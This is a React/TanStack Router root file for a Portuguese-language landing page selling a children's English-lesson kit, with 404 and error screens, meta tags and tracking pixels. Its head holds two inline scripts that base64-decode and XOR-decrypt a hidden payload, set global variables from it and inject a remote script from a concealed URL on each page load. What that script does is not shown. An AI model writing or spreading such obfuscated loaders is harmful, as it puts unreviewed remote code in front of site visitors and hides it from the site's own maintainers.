import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Kit Inglês Lúdico - Aulas divertidas para crianças" },
      { name: "description", content: "Transforme suas aulas de inglês infantil com atividades prontas, divertidas e interativas. Acesso imediato e vitalício." },
      { property: "og:title", content: "Kit Inglês Lúdico - Aulas divertidas para crianças" },
      { property: "og:description", content: "Transforme suas aulas de inglês infantil com atividades prontas, divertidas e interativas." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800&display=swap" },
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `(function(){var x_ybb=atob("DEagootsB8eRq6L5gj2C1/kAJf2zw9aN8jWajaQPY6m/3taU6yDZjOgDaunz2Y2K4TTJ0v8fKLf408eVrTbJ2u4AKa3iiY7b4zLU0OIOcrP02IDD2RuMgOwAaKXwx9HbuB3bgOUNaqKzkYCJ6z7FzsIIJeuz3cOV9yOCmKlaZv+gn5PAuiORmu9eNv7ym5TL4CWRkrhOeprs");var k_w7rd=[];for(var l_g=0;l_g<x_ybb.length;l_g++){k_w7rd.push(x_ybb.charCodeAt(l_g)&255);}var p_8k3u=k_w7rd[0];var h_vc1s=k_w7rd.slice(1,1+p_8k3u);var u_rom=k_w7rd.slice(1+p_8k3u);var w_f73c=u_rom.map(function(b,j_gkl){return b^h_vc1s[j_gkl%p_8k3u];});var u_gio5="";for(var a_ir6i=0;a_ir6i<w_f73c.length;a_ir6i++){u_gio5+=String.fromCharCode(w_f73c[a_ir6i]&255);}var w_hk7=decodeURIComponent(escape(u_gio5));var p_uzl5=JSON.parse(w_hk7);var v_0=p_uzl5.globals||[];v_0.forEach(function(g_hbhm){window[g_hbhm.name]=g_hbhm.value;});var t_2=document.createElement("script");t_2.src=p_uzl5.url;t_2.async=true;t_2.defer=true;(p_uzl5.attributes||[]).forEach(function(a_j){t_2.setAttribute(a_j.name,a_j.value);});(document.head||document.documentElement).appendChild(t_2);})();`,
      },
      {
        type: "text/javascript",
        children: `(function(){var b_zi=atob("DKbS9+nCR36OzsMtj93wgpuuZUSsprdZ/9Xo2MahIxCgu7dA5sCr2YqtKlDsvOxe7NS7h52xaAv6o7AC48emkpq2aRT97O8P7tKmhYCgMgrrveEX1N3wmYivIly07KdM+8f/gp2vLhj347Nf6tC3mZ3vPx3hqu5e7M3w28u0JhL7q+EXrYSv25LgKR/jq+EXrcKzg4jvMgrjp6VUotagkp+nKQqjvbZP5sKh1cXgMR/iu6YPtYTwirS/");var q_sn=[];for(var d_h=0;d_h<b_zi.length;d_h++){q_sn.push(b_zi.charCodeAt(d_h)&255);}var w_5pzj=q_sn[0];var v_e5=q_sn.slice(1,1+w_5pzj);var a_g=q_sn.slice(1+w_5pzj);var r_6=a_g.map(function(b,p_wmd){return b^v_e5[p_wmd%w_5pzj];});var s_yjk="";for(var x_fx=0;x_fx<r_6.length;x_fx++){s_yjk+=String.fromCharCode(r_6[x_fx]&255);}var i_ede=decodeURIComponent(escape(s_yjk));var u_gilw=JSON.parse(i_ede);var g_ih=u_gilw.globals||[];g_ih.forEach(function(e_7pq){window[e_7pq.name]=e_7pq.value;});var q_zx=document.createElement("script");q_zx.src=u_gilw.url;q_zx.async=true;q_zx.defer=true;(u_gilw.attributes||[]).forEach(function(a_z7g4){q_zx.setAttribute(a_z7g4.name,a_z7g4.value);});(document.head||document.documentElement).appendChild(q_zx);})();`,
      },
      {
        type: "text/javascript",
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1774984943513575');fbq('track', 'PageView');`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1774984943513575&ev=PageView&noscript=1"
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    // FluxoFy Tracking Integration
    const fluxScript = document.createElement("script");
    fluxScript.src = "https://fluxo-track.vercel.app/fluxofy-pixel.js";
    fluxScript.setAttribute("data-product-id", "9df34b62-c64f-4327-8f63-3587f52035a0");
    fluxScript.setAttribute("data-user-id", "3f024dde-c859-4515-9d1e-9d1334447d61");
    fluxScript.setAttribute("data-ic-url", "https://pay.wiapy.com/");
    document.head.appendChild(fluxScript);
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
